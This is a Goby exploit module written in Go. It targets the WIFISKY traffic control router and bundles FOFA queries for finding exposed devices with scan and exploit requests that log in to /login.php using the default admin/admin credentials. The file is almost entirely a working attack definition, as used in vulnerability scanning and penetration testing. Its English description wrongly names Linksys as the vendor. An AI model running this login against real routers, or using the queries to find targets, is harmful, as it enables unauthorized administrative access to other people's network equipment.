package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "The traffic control router from szwifisky in /login.php Default Password Vulnerability",
    "Description": "<p>The WIFISKY 7-layer traffic control router from Linksys has a Default  password vulnerability</p>",
    "Product": "szwifisky",
    "Homepage": "http://www.szwifisky.com/",
    "DisclosureDate": "2024-07-10",
    "PostTime": "2024-07-11",
    "Author": "1538279017@qq.com",
    "FofaQuery": "title=\"WIFISKY 7层流控路由器\"&&body=\"深圳市领空技术有限公司\"",
    "GobyQuery": "title=\"WIFISKY 7层流控路由器\"&&body=\"深圳市领空技术有限公司\"",
    "Level": "2",
    "Impact": "<p>It allows direct access to the backend with the admin user, enabling modifications to permissions and access to sensitive information</p>",
    "Recommendation": "<p>Change to a strong password.</p>",
    "References": [
        "https://cn-sec.com/archives/421736.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.php?action=login&type=admin",
                "follow_redirect": true,
                "header": {
                    "Cookie": "SESSID=any",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Content-Length": "29"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"id\":1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{scheme}}}://admin@admin:{{{hostinfo}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.php?action=login&type=admin",
                "follow_redirect": true,
                "header": {
                    "Cookie": "SESSID=any"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|NULL|variable|弱口令为:admin/admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4",
    "Translation": {
        "CN": {
            "Name": "领空技术WIFISKY7层流控路由器 /login.php 默认口令漏洞",
            "Product": "领空技术WIFISKY",
            "Description": "<p>领空技术WIFISKY 7层流控路由器存在默认口令漏洞<br></p>",
            "Recommendation": "<p>更换强密码</p>",
            "Impact": "<p>可直接以admin用户访问后台,进行相关权限修改以及查看敏感信息</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "The traffic control router from szwifisky in /login.php Default Password Vulnerability",
            "Product": "szwifisky",
            "Description": "<p>The WIFISKY 7-layer traffic control router from Linksys has a Default&nbsp; password vulnerability<br></p>",
            "Recommendation": "<p>Change to a strong password.<br></p>",
            "Impact": "<p>It allows direct access to the backend with the admin user, enabling modifications to permissions and access to sensitive information<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10969"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}